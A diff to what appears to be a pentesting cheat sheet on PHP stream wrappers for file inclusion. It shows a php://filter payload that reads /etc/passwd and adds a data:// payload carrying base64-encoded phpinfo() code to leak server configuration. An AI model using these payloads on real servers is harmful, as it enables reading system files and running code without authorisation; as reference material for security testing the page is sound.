@@ -22,7 +22,8 @@ php://filter/convert.base64-encode/resource=/etc/passwd
 
 #### `data://`&#x20;
 
+The following payload contains a base64 encoded value for `<?php phpinfo(); ?>`, which will allow us to view the PHP configuration details, potentially leaking sensitive data.&#x20;
+
 ```sh
-# base64 encoded
-data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7JTIwPz4K 
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
 ```
